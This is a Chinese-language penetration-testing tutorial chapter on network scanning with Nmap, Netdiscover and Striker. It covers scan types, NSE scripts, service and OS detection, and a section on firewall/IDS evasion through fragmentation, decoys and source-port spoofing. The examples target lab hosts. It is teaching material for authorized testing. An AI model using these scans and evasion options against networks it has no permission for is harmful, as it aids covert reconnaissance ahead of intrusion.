在描述端口状态之后，我们将描述在渗透测试中常用的几个选项，然后我们将在实践中使用这些选项。

# Nmap 目标规范

Nmap 将处理命令行上不是选项或选项参数的所有内容作为目标主机规范。我们建议您使用 IP 地址规范而不是主机名。通过使用 IP 地址，Nmap 不需要首先进行 DNS 解析。这将加快端口扫描过程。

在当前版本中，Nmap 支持以下 IPv4 地址规范：

+   它支持单个主机，比如`172.16.43.156`。

+   它支持使用 CIDR 表示法的相邻主机的整个网络，比如`172.16.43.0/24`。这个规范将包括从`172.16.43.0`到`172.16.43.255`的 256 个 IP 地址。

+   它支持八进制范围寻址，比如`172.16.2-4,6.1`。这种寻址将包括四个 IP 地址：`172.16.2.1`、`172.16.3.1`、`172.16.4.1`和`172.16.6.1`。

+   它支持多个主机规范，比如`172.16.43.1 172.168.3-5,9.1`。

对于 IPv6 地址，Nmap 只支持完全合格的 IPv6 格式和主机名，比如`fe80::a8bb:ccff:fedd:eeff%eth0`。

除了从命令行获取目标规范外，Nmap 还可以通过使用`-iL <inputfilename>`选项从文本文件中接受目标定义。如果我们已经从另一个程序获得了 IP 地址，这个选项就很有用。

确保文件中的条目使用 Nmap 支持的目标规范格式。每个条目必须用空格、制表符或新行分隔。

以下代码是该文件的示例：

```
172.16.1.1-254 
172.16.2.1-254 
```

现在，让我们扫描`172.16.430/24`的网络。我们想要查看 Nmap 发送的数据包。为了监视发送的数据包，我们可以使用数据包捕获实用程序，比如`tcpdump`。

打开一个控制台，输入以下命令：

```
tcpdump -nnX tcp and host 172.16.43.150  
```

`172.16.43.150` IP 地址属于我们的机器，它启动了 Nmap。您需要根据您的配置进行调整。

在同一台机器上打开另一个控制台，输入以下命令：

```
    nmap 172.16.43.0/24

```

在`tcpdump`控制台中，您将看到以下数据包：

```
    22:42:12.107532 IP 172.16.43.150.49270 >172.16.43.156.23: Flags [S], seq 239440322, win 1024, options [mss 1460], length 0
      0x0000:  4500 002c eb7f 0000 3006 ad2e c0a8 3866  E..,....0.....8f
      0x0010:  c0a8 3867 c076 0017 0e45 91c2 0000 0000  ..8g.v...E......
      0x0020:  6002 0400 4173 0000 0204 05b4            `...As......

```

根据前面的数据包信息，我们知道攻击机器从端口`49270`向目标机器端口`23`（Telnet）发送了一个设置了 SYN 标志的数据包。如果 Nmap 由特权用户（如 Kali Linux 中的`root`）运行，默认情况下会设置 SYN 标志。

以下屏幕截图显示了攻击机器发送到目标网络上其他机器和端口的数据包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0c288704-bc73-47b4-97be-79bf2b971c5e.png)

如果远程机器响应，响应数据包将如下所示：

```
22:36:19.939881 IP 172.16.43.150.1720 >172.16.43.156.47823: Flags [R.], seq 0, ack 1053563675, win 0, length 0 
  0x0000:  4500 0028 0000 4000 4006 48b2 c0a8 3867  E..(..@.@.H...8g 
  0x0010:  c0a8 3866 06b8 bacf 0000 0000 3ecc 1b1b  ..8f........>... 
  0x0020:  5014 0000 a243 0000 0000 0000 0000       P....C........ 
```

请注意，发送的标志由字符`R`表示，即重置。这意味着目标机器中的端口`1720`是关闭的。我们可以通过之前的 Nmap 结果来验证这一点。

但是，如果端口是开放的，您将看到以下网络流量：

```
22:42:12.108741 IP 172.16.43.156.23 >172.16.43.150.49270:Flags [S.], seq 1611132106, ack 239440323, win 5840,options [mss 1460], length 0 
  0x0000:  4500 002c 0000 4000 4006 48ae c0a8 3867  E..,..@.@.H...8g 
  0x0010:  c0a8 3866 0017 c076 6007 ecca 0e45 91c3  ..8f...v`....E.. 
  0x0020:  6012 16d0 e1bf 0000 0204 05b4 0000 
```

您可以看到前面代码中的数据包是用来确认先前显示的数据包的序列号的。此数据包的确认号为`239440323`，而前一个数据包的序列号为`239440322`。

# Nmap TCP 扫描选项

要能够使用大多数 TCP 扫描选项，Nmap 需要一个特权用户（Unix 世界中的根级帐户或 Windows 世界中的管理员级帐户）。这用于发送和接收原始数据包。默认情况下，Nmap 将使用 TCP SYN 扫描，但如果 Nmap 没有特权用户，则将使用 TCP 连接扫描。Nmap 使用的各种扫描如下：

+   TCP 连接扫描（-sT）：此选项将完成与每个目标端口的三次握手。如果连接成功，则认为端口是开放的。由于需要对每个端口进行三次握手，因此此扫描类型速度较慢，并且很可能会被目标记录。如果 Nmap 由没有任何特权的用户运行，则使用此默认扫描选项。

+   SYN 扫描（-sS）：此选项也称为半开放或 SYN 隐身。使用此选项，Nmap 发送一个 SYN 数据包，然后等待响应。SYN/ACK 响应表示端口正在监听，而 RST/ACK 响应表示端口未在监听。如果没有响应或者是 ICMP 不可达的错误消息响应，则认为端口被过滤。此扫描类型可以快速执行，并且由于三次握手从未完成，因此不会引人注目和隐秘。如果以特权用户身份运行 Nmap，则这是默认的扫描选项。

+   TCP NULL 扫描（-sN）、FIN 扫描（-sF）和 XMAS 扫描（-sX）：`NULL`扫描不设置任何控制位。FIN 扫描只设置 FIN 标志位，而`XMAS`扫描设置 FIN、PSH 和 URG 标志。如果收到 RST 数据包作为响应，则认为端口关闭，而没有响应则表示端口是开放/被过滤的。

+   TCP Maimon 扫描（-sM）：TCP Maimon 扫描是由 Uriel Maimon 发现的。此类型的扫描将发送一个设置了 FIN/ACK 标志位的数据包。如果端口是开放的，基于 BSD 的系统将丢弃数据包，并在端口关闭时响应 RST。

+   TCP ACK 扫描（-sA）：此扫描类型用于确定防火墙是否具有状态，并且哪些端口被过滤。此类型的网络数据包仅设置 ACK 位。如果返回 RST，则表示目标未被过滤。

+   TCP 窗口扫描（-sW）：此扫描类型通过检查 RST 数据包响应的 TCP 窗口字段来工作。开放端口将具有正的 TCP 窗口值，而关闭端口将具有零的 TCP 窗口值。

+   TCP 空闲扫描（-sI）：使用此技术，您的机器不会向目标发送任何数据包；相反，扫描将反弹到您指定的僵尸主机。IDS 将报告僵尸为攻击者。

+   Nmap 还支持您通过提供**scanflags**选项来创建自己的自定义 TCP 扫描。该选项的参数可以是数字，例如`9`表示 PSH 和 FIN，也可以是符号名称。只需以任何顺序组合 URG、ACK、PSH、RST、SYN、FIN、ECE、CWR、ALL 和 NONE；例如，`--scanflags URGACKPSH`将设置 URG、ACK 和 PSH 标志。

# 禁用主机发现

如果主机阻止了 ping 请求，Nmap 可能会检测到主机不活动；因此，Nmap 可能不会执行诸如端口扫描、版本检测和操作系统检测等重型探测。为了克服这一点，Nmap 具有一个禁用主机发现的功能。使用此选项，Nmap 将假定目标机器可用，并将对该机器执行重型探测。

此选项使用`-Pn`选项激活。

# Nmap UDP 扫描选项

尽管 TCP 扫描有许多类型的扫描，但 UDP 扫描只有一种类型，即 UDP 扫描（`-sU`）。尽管 UDP 扫描不如 TCP 扫描可靠，但作为渗透测试人员，您不应忽视此扫描，因为这些 UDP 端口上可能有有趣的服务。

UDP 扫描的最大问题是如何快速执行扫描。Linux 内核限制发送`ICMP 端口不可达`消息每秒一条。对一台机器进行 65,536 个端口的 UDP 扫描将需要超过 18 小时才能完成。

为了帮助缓解这个问题，可以使用几种方法，如下所示：

+   并行运行 UDP 扫描

+   首先扫描最流行的端口

+   在防火墙后面扫描

+   将`--host-timeout`选项设置为跳过慢主机

这些方法可以帮助减少进行 UDP 端口扫描所需的时间。

让我们看一个场景，我们想要找出目标机器上开放的 UDP 端口。为了加快扫描过程，我们将仅检查端口`53`（DNS）和`161`（SNMP）。以下是用于执行此操作的命令：

```
nmap -sU 172.16.43.156 -p 53,161  
```

以下是此命令的结果：

```
Nmap scan report for 172.16.43.156
Host is up (0.0016s latency).
PORT    STATE  SERVICE
53/udp  open   domain
161/udp closed snmp  
```

# Nmap 端口规范

在默认配置中，Nmap 将仅随机扫描每个协议的 1,000 个最常见端口。`nmap-services`文件包含用于选择顶端口的流行度分数。

要更改该配置，Nmap 提供了几个选项：

+   `-p` **端口范围**：这只扫描定义的端口。要扫描端口`1`到`1024`，命令是`-p 1-1024`。要扫描端口`1`到`65535`，命令是`-p-`。

+   `-F` **（快速）**：这将仅扫描 100 个常见端口。

+   `-r` **（不随机化端口）**：此选项将设置顺序端口扫描（从最低到最高）。

+   `--top-ports <1 或更大>`：此选项将仅扫描`nmap-service`文件中发现的`N`个最高比例端口。

要使用 TCP NULL 扫描方法扫描端口`22`和`25`，可以使用以下命令：

```
nmap -sN -p 22,25 172.16.43.156 
```

以下命令行是结果：

```
    Nmap scan report for 172.16.43.156
    Host is up (0.00089s latency).
    PORT     STATE         SERVICE
    22/tcp   open|filtered ssh
    25/tcp   open|filtered smtp
    MAC Address: 00:0C:29:18:0F:08 (VMware)
    Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
```

以下是数据包的转储片段：

```
23:23:38.581818 IP 172.16.43.150.61870 >172.16.43.156.22: Flags [], win 1024, length 0 
  0x0000:  4500 0028 06e4 0000 2f06 92ce c0a8 3866  E..(..../.....8f 
  0x0010:  c0a8 3867 f1ae 0016 dd9e bf90 0000 0000  ..8g............ 
  0x0020:  5000 0400 2ad2 0000                      P...*... 

23:23:38.581866 IP 172.16.43.150.61870 >172.16.43.156.25: Flags [], win 1024, length 0 
  0x0000:  4500 0028 1117 0000 3106 869b c0a8 3866  E..(....1.....8f 
  0x0010:  c0a8 3867 f1ae 0019 dd9e bf90 0000 0000  ..8g............ 
  0x0020:  5000 0400 2acf 0000                      P...*... 

23:23:39.683483 IP 172.16.43.150.61871 >172.16.43.156.25: Flags [], win 1024, length 0 
  0x0000:  4500 0028 afaf 0000 2706 f202 c0a8 3866  E..(....'.....8f 
  0x0010:  c0a8 3867 f1af 0019 dd9f bf91 0000 0000  ..8g............ 
  0x0020:  5000 0400 2acc 0000                      P...*... 

23:23:39.683731 IP 172.16.43.150.61871 >172.16.43.156.22: Flags [], win 1024, length 0 
  0x0000:  4500 0028 5488 0000 3506 3f2a c0a8 3866  E..(T...5.?*..8f 
  0x0010:  c0a8 3867 f1af 0016 dd9f bf91 0000 0000  ..8g............ 
  0x0020:  5000 0400 2acf 0000                      P...*...   
```

从前面的代码中显示的数据包中，我们可以看到以下内容：

+   在第一和第二个数据包中，攻击机器检查目标机器上的端口`22`是否开放。一段时间后，它检查目标机器上的端口`25`。

+   在第三和第四个数据包中，攻击机器检查目标机器上的端口`25`是否开放。一段时间后，它检查目标机器上的端口`22`。

+   等待一段时间后，由于目标机器仍未响应，Nmap 得出结论认为这两个端口是开放的或被过滤的。

# Nmap 输出选项

Nmap 的结果可以保存到外部文件。如果您想要使用其他工具处理 Nmap 结果，此选项非常有用。即使将输出保存到文件，Nmap 仍会在屏幕上显示结果。

Nmap 支持几种输出格式，如下所示：

+   **交互式输出**：这是默认的输出格式，结果发送到标准输出。

+   **正常输出（**`-oN`**）**：此格式类似于交互式输出，但不包括运行时信息和警告。

+   **XML 输出（**`-oX`**）**：此格式可以转换为 HTML 格式，由 Nmap 图形用户界面（GUI）解析，或导入到数据库。我们建议您尽可能使用此输出格式。

+   Grepable 输出（`-oG`）：此格式已被弃用，但仍然相当受欢迎。Grepable 输出包括注释（以井号（`#`）开头的行）和目标行。目标行包括六个标记字段的组合，这些字段由制表符分隔，并在冒号后面。字段是`Host`、`Ports`、`Protocols`、`Ignored State`、`OS`、`Seq Index`、`IP ID Seq`和`Status`。如果我们想要使用 UNIX 命令（如`grep`和`awk`）处理 Nmap 输出，有时会使用此输出。

您可以使用`-oA`选项一次保存 Nmap 结果为三种格式（正常、XML 和 grepable）。

要将扫描结果保存到 XML 文件（`myscan.xml`），请使用以下命令：

```
nmap 172.16.43.156 -oX myscan.xml  
```

以下是 XML 文件的片段：

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE nmaprun> 
<?xml-stylesheet href="file:///usr/bin/../share/nmap/nmap.xsl" type="text/xsl"?> 
<!-- Nmap 6.49BETA4 scan initiated Mon Feb 15 18:06:20 2016 as: nmap -oX metasploitablescan.xml 172.16.43.156 --> 
<nmaprun scanner="nmap" args="nmap -oX metasploitablescan.xml 172.16.43.156" start="1455588380" startstr="Mon Feb 15 18:06:20 2016" version="6.49BETA4" 
<scaninfo type="syn" protocol="tcp" numservices="1000" services="1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700, 
```

出于简洁起见，上面的片段中删除了一些端口。在 XML 输出中，您将看到 Nmap 针对每个端口进行扫描。以下显示了每个被单独扫描的端口及其响应。同样，出于简洁起见，未包括所有端口：

```
    <verbose level="0"/>
    <debugging level="0"/>
    <host starttime="1455588380" endtime="1455588382"><status state="up" reason="arp-response" reason_ttl="0"/>
    <address addr="172.16.43.156" addrtype="ipv4"/>
    <address addr="00:0C:29:18:0F:08" addrtype="mac" vendor="VMware"/>
    <hostnames>
    </hostnames>
    <ports><extraports state="closed" count="977">
    <extrareasons reason="resets" count="977"/>
    </extraports>
    <port protocol="tcp" portid="21"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="ftp" method="table" conf="3"/></port>
    <port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="ssh" method="table" conf="3"/></port>
    <port protocol="tcp" portid="23"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="telnet" method="table" conf="3"/></port>
    <port protocol="tcp" portid="25"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="smtp" method="table" conf="3"/></port>
    <port protocol="tcp" portid="53"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="domain" method="table" conf="3"/></port>
    <port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="http" method="table" conf="3"/></port>
    <port protocol="tcp" portid="111"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="rpcbind" method="table" conf="3"/></port>
    <port protocol="tcp" portid="139"><state state="open" reason="syn-ack" reason_ttl="64"/><service name="netbios-ssn" method="table" conf="3"/></port>

```

XML 输出有点令人生畏。为了使其更容易，您可以将 Nmap XML 文件转换为 HTML。这样，您可以获得干净的输出以供报告使用，因为您可能向非技术人员报告，他们可能不习惯查看原始输出。要转换 XML 文件，您可以使用`xsltproc`程序。以下命令用于将 XML 文件转换为 HTML 文件：

```
xsltproc myscan.xml -o myscan.html 
```

以下是 HTML 报告的一部分，由 Kali Linux 中包含的 Firefox ESR 浏览器显示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/85f43d2b-f099-4327-8fec-0994fc3f867c.png)

如果您想要根据自己的喜好处理 Nmap XML 输出，有几个通用的编程语言 XML 库可供您使用。此外，还有几个专门开发用于处理 Nmap 输出的库：

+   Perl：Nmap-Parser（[`search.cpan.org/dist/Nmap-Parser/`](http://search.cpan.org/dist/Nmap-Parser/)）

+   Python：python-nmap（[`xael.org/norman/python/python-nmap/`](http://xael.org/norman/python/python-nmap/)）

+   Ruby：Ruby Nmap（[`rubynmap.sourceforge.net/`](http://rubynmap.sourceforge.net/)）

+   PowerShell：用于解析 Nmap XML 输出的 PowerShell 脚本（[`www.sans.org/windows-security/2009/06/11/powershell-script-to-parse-nmap-xml-output`](http://www.sans.org/windows-security/2009/06/11/powershell-script-to-parse-nmap-xml-output)）

# Nmap 时间选项

Nmap 配有六种定时模式，您可以使用选项（`-T`）进行设置：

+   `paranoid (0)`: 在此时间模式下，每五分钟发送一个数据包。数据包是串行发送的。此模式可用于避免 IDS 检测。

+   `sneaky (1)`: 此模式每 15 秒发送一个数据包，没有并行发送数据包。

+   `polite (2)`: 此模式每 0.4 秒发送一个数据包，没有并行传输。

+   `normal (3)`: 此模式将多个数据包同时发送到多个目标。这是 Nmap 使用的默认时间模式。它在时间和网络负载之间平衡。

+   `aggressive (4)`: Nmap 将在移动到下一个目标之前仅扫描给定主机 5 分钟。Nmap 不会等待超过 1.25 秒的响应。

+   `insane (5)`: 在此模式下，Nmap 将在移动到下一个目标之前仅扫描给定主机 75 秒。Nmap 不会等待超过 0.3 秒的响应。

根据我们的经验，默认的定时模式通常效果很好，除非您想要进行更隐秘或更快速的扫描。

# 有用的 Nmap 选项

在本节中，我们将讨论在进行渗透测试工作时非常有用的几个 Nmap 选项。

# 服务版本检测

在进行端口扫描时，也可以要求 Nmap 检查服务版本。在进行后续的漏洞识别过程时，此信息非常有用。

要使用此功能，请给 Nmap 添加`-sV`选项。

以下是此功能用法的示例。我们想要找到端口`22`上使用的软件版本：

```
    nmap -sV 172.16.43.156 -p 22
```

以下是此命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a839fe05-ccce-47e3-88f5-6a440c1a7a6b.png)

根据上述信息，我们知道端口`22`上有一个使用`OpenSSH`软件版本 4.7p1 的 SSH 服务，SSH 协议是`2.0`。

# 操作系统检测

Nmap 还可以查询目标机器使用的操作系统。在进行后续的漏洞识别过程中，这些信息非常有用。

要使用此功能，请给 Nmap 加上`-O`选项。

以下是此功能用法的示例。我们想要找到目标机器上使用的操作系统：

```
    nmap -O 172.16.43.156 
```

以下命令行是此命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/16d75c31-92c3-4c68-9052-bf0d2a833834.png)

根据上述信息，我们可以看到远程系统是使用 Linux 内核版本`2.6.9 - 2.6.33`的 Linux 操作系统。如果这些 Linux 内核存在漏洞，我们可以利用它们。

# Aggressive scan

如果使用`-A`选项，它将启用以下探测：

+   服务版本检测（`-sV`）

+   操作系统检测（`-O`）

+   脚本扫描（`-sC`）

+   Traceroute（`--traceroute`）

这种扫描类型可能需要一些时间才能完成。以下命令可用于进行主动扫描：

```
    nmap -A 172.16.43.156
```

以下是此命令的摘要结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9bbd9901-bb24-40b6-af62-ed66cb8ab16b.png)

除了有关端口、服务和证书的详细信息之外，我们还可以在结果的后面获得有关配置在目标机器上的 Apache Web 服务器的详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/1ac74298-c7a0-422d-985e-31a6c59ef639.png)

# 用于扫描 IPv6 目标的 Nmap

在前一节中，我们提到您可以在 Nmap 中指定 IPv6 目标。在本节中，我们将深入讨论这个问题。

对于这种情况，每台机器的 IPv6 地址如下：

```
    Target machine: fe80::20c:29ff:fe18:f08
```

要扫描 IPv6 目标，只需使用`-6`选项并定义 IPv6 目标地址。目前，您只能指定单个 IPv6 地址。以下是扫描 IPv6 地址的示例命令：

```
    nmap -6 fe80::20c:29ff:fe18:f08
```

以下是此命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f52fa5e0-9c8d-4aa1-b95a-ba9681002f98.png)

我们可以看到，在 IPv6 测试中，开放的端口数量比 IPv4 测试中少。这可能是由于远程机器上的服务尚不支持 IPv6。

# 使用 Netdiscover 进行扫描

Netdiscover 是另一个发现工具，内置于 Kali Linux 2018.2 中。目前处于.03-pre-beta7 版本，由 Jaime Penalba 编写，Netdiscover 可以使用 ARP 请求对无线和交换网络进行侦察和发现。

要启动 Netdiscover，请键入`netdiscover -h`以查看使用选项。（如果只键入`netdiscover`命令，Netdiscover 将启动默认扫描。）

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/8fdecc99-2a53-4356-890a-bf3081d6490a.jpg)

要扫描一系列 IP 地址，请键入`netdiscover -r`，然后输入 IP 范围。在本例中，我们使用了`netdiscover -r 10.10.0.0/24`。您还可以选择使用`netdiscover -p`选项进行被动扫描。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/26f29542-14fe-47d3-aee9-3a95e00f644e.jpg)

在前面的扫描中，我们可以看到发现了 Dell 和 HP 工作站、思科设备，甚至还有施乐多功能设备。

# Nmap 脚本引擎

尽管 Nmap 本身已经成为一个强大的网络探索工具，但通过额外的脚本引擎功能，Nmap 变得更加强大。使用**Nmap 脚本引擎**（**NSE**），用户可以自动化各种网络任务，例如检查应用程序中的新安全漏洞、检测应用程序版本或其他 Nmap 中不可用的功能。Nmap 已经在其软件包中包含了各种 NSE 脚本，但用户也可以编写自己的脚本以满足其需求。

NSE 脚本利用了嵌入在 Nmap 中的 Lua 编程语言（[`www.lua.org`](http://www.lua.org)），目前，NSE 脚本分为以下几类：

+   `auth`：此类别中的脚本用于查找目标系统上的身份验证设置；例如，通过使用暴力破解技术。

+   `default`：这些脚本使用`-sC`或`-A`选项运行。如果脚本满足以下要求，脚本将被分组到默认类别中：

+   它必须快速

+   它需要产生有价值且可操作的信息

+   它的输出需要详细而简洁

+   它必须是可靠的

+   它不应对目标系统造成侵入

+   它应该向第三方泄露信息

+   `discovery`：这些脚本用于查找网络。

+   **DoS**：此类别中的脚本可能会在目标系统上引起**拒绝服务**（**DoS**）。请谨慎使用。

+   `exploit`：这些脚本将利用目标系统上的安全漏洞。渗透测试人员需要获得在目标系统上运行这些脚本的权限。

+   `external`：这些脚本可能泄露信息给第三方。

+   `fuzzer`：这些脚本用于对目标系统进行模糊测试。

+   `intrusive`：这些脚本可能会使目标系统崩溃或使用目标系统的所有资源。

+   `malware`：这些脚本将检查目标系统上恶意软件或后门的存在。

+   `safe`：这些脚本不应该导致服务崩溃，**拒绝服务**（**DoS**）或利用目标系统。

+   `version`：这些脚本与版本检测选项（`-sV`）一起使用，以对目标系统上的服务进行高级检测。

+   `vuln`：这些脚本用于检查目标系统的安全漏洞。

在 Kali Linux 中，这些 Nmap 脚本位于`/usr/share/nmap/scripts`目录中，目前，包含在 Kali Linux 中的 Nmap 版本 7.70 包含 588 个脚本。

有几个命令行参数可用于调用 NSE，如下所示：

+   `-sC 或--script=default`：这将使用默认脚本执行扫描。

+   `--script <filename> | <category> | <directories>`：这将使用文件名、类别或目录中定义的脚本执行扫描。

+   `--script-args <args>`：这提供了一个脚本参数。这些参数的一个示例是用户名或密码，如果您使用`auth`类别。

对于端口扫描`172.16.43.156`主机并利用默认脚本类别，我们可以给出以下命令：

```
    nmap -sC 172.16.43.156

```

以下是一个缩短的结果：

```
    Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-02-22 17:09 PST
    Nmap scan report for 172.16.43.156
    Host is up (0.000099s latency).
    Not shown: 977 closed ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp   open  ssh
    | ssh-hostkey: 
    |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
    |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
    23/tcp   open  telnet
    25/tcp   open  smtp
    |_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    | ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
    | Not valid before: 2010-03-17T14:07:45
    |_Not valid after:  2010-04-16T14:07:45
    |_ssl-date: 2016-02-12T05:51:52+00:00; -10d19h17m25s from scanner time.
    53/tcp   open  domain
    | dns-nsid: 
    |_  bind.version: 9.4.2
    80/tcp   open  http
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    |_http-title: Metasploitable2 - Linux
    8009/tcp open  ajp13
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8180/tcp open  unknown
    |_http-favicon: Apache Tomcat
    |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
    |_http-title: Apache Tomcat/5.5
    MAC Address: 00:0C:29:18:0F:08 (VMware)

    Host script results:
    |_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Unix (Samba 3.0.20-Debian)
    |   NetBIOS computer name: 
    |   Workgroup: WORKGROUP
    |_  System time: 2016-02-12T00:51:49-05:00

    Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds

```

从前面的信息中，您可以看到 Nmap 结果现在更加彻底。这是因为它利用了 NSE 默认脚本。

然而，如果您只想获取有关目标系统的特定信息，可以单独使用脚本。如果我们想收集有关 HTTP 服务器的信息，可以使用 NSE 中的几个 HTTP 脚本，例如`http-enum`，`http-headers`，`http-methods`和`http-php-version`，使用以下命令：

```
    nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 172.16.43.156  
```

以下是此命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ce668a8e-e17b-439b-948a-a521cfadb95f.png)

通过利用与 HTTP 相关的四个 NSE 脚本，我们可以获得有关目标系统 Web 服务器的更多信息：

+   有几个有趣的目录要检查：`Tikiwiki`，`test`和`phpMyAdmin`

+   我们有一个有趣的文件：`phpinfo.php`

+   我们知道服务器正在使用 PHP 版本`5.2.3 -5.2.5`

在讨论了 Nmap 之后，让我们讨论另一个端口扫描工具。

有一个有用的 NSE 脚本称为 Nmap NSE Vulscan（[`www.computec.ch/mruef/software/nmap_nse_vulscan-1.0.tar.gz`](http://www.computec.ch/mruef/software/nmap_nse_vulscan-1.0.tar.gz)），它可以帮助您将从目标机器获取的版本信息与 CVE（[`cve.mitre.org/`](http://cve.mitre.org/)）、VulDB（[`vuldb.com/?`](https://vuldb.com/?)）、SecurityTracker（[`securitytracker.com/`](http://securitytracker.com/)）和 SecurityFocus（[`www.securityfocus.com/`](http://www.securityfocus.com/)）等漏洞数据库进行映射。

以下屏幕截图显示了 CVE 脚本的示例结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b42f504b-c463-4634-b76c-123e03fa979d.png)

# 防火墙/IDS 规避的 Nmap 选项

在渗透测试期间，您可能会遇到使用防火墙和 IDS 保护系统的系统。如果您只使用默认设置，您的操作可能会被检测到，或者您可能无法从 Nmap 获得正确的结果。以下选项可用于帮助您规避防火墙/IDS：

+   -f **（分片数据包）**：此选项的目的是使数据包更难被检测到。通过指定此选项一次，Nmap 将在 IP 头之后将数据包分割为 8 字节或更少。

+   --mtu：使用此选项，您可以指定自己的数据包大小分片。**最大传输单元**（**MTU**）必须是 8 的倍数，否则 Nmap 将出错并退出。

+   -D **（诱饵）**：通过使用此选项，Nmap 将从用户指定的欺骗 IP 地址发送一些探测。其想法是掩盖用户在日志文件中的真实 IP 地址。用户 IP 地址仍然在日志中。您可以使用`RND`生成随机 IP 地址，或使用`RND：number`生成`<number>`个 IP 地址。您用于诱饵的主机应该是活动的，否则将会淹没目标。还要记住，使用许多诱饵可能会导致网络拥塞，因此您可能希望避免这种情况，特别是在扫描客户网络时。

+   --source-port <portnumber>或-g（欺骗源端口）：如果防火墙设置为允许来自特定端口的所有传入流量，此选项将非常有用。

+   --data-length：此选项用于更改 Nmap 发送的默认数据长度，以避免被检测为 Nmap 扫描。

+   --max-parallelism：通常将此选项设置为 1，以指示 Nmap 一次发送不超过一个探测到目标主机。

+   --scan-delay <time>：此选项可用于规避使用阈值检测端口扫描活动的 IDS/IPS。

您还可以尝试其他 Nmap 规避选项，如 Nmap 手册中所述（[`nmap.org/book/man-bypass-firewalls-ids.html`](http://nmap.org/book/man-bypass-firewalls-ids.html)）。

# 使用 Striker 进行自动扫描

Striker 是一个内置 Python 的自动扫描和深度信息收集工具，用于执行端口/服务和漏洞扫描。与我们在上一章中使用的自动化工具（Red_Hawk 和 Devploit）类似，Striker 安装和使用都很简单。

我们必须首先下载 Striker。为此，请打开终端并输入以下内容更改为`Desktop`（或您选择的目录）：

```
cd Desktop
```

输入以下内容将 Striker 克隆到您的桌面或（或您选择的目录）：

```
git clone https://github.com/s0md3v/Striker.git
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/43032ee7-6c3c-42c7-a787-6d2f322fd574.jpg)

一旦成功下载完成（如前一个屏幕截图中所示，对象和增量均为 100%），输入`cd Striker`，然后使用`ls`命令列出 Striker 文件夹中的文件。您应该看到列出了五个文件，包括`requirements.txt`和`striker.py`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/61a0865f-64fa-4da7-abdd-96f580ac3100.jpg)

为了使 Striker 无错误地运行，我们必须首先使用软件包管理安装程序（`pip`）来确保满足运行 Striker 所需的所有要求，包括 Whois 模块（这对于信息收集是必要的）。

为此，我们运行以下两个命令，`pip install -r requirements.txt`，然后是`pip install whois`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5cc78dab-f95c-413c-837a-25ccc92a6469.jpg)

安装成功所有要求后，输入`pip install whois`（即使可能已经安装了要求）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9d78d1aa-0b15-453d-9588-499324b0244d.jpg)

最后，要运行 Striker，我们输入`python striker.py`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/50b626aa-534b-42a0-bdf0-5ab1b39da866.jpg)

现在将运行 Striker GUI。作为一个完全自动化的工具，从这一点开始所需的只是目标 IP 或 URL。

在此示例中，我们使用了用于 Nmap 扫描部分的[`scanme.nmap.org/`](http://scanme.nmap.org/)网站。将扫描结果与 Nmap 之前发现的结果进行比较：

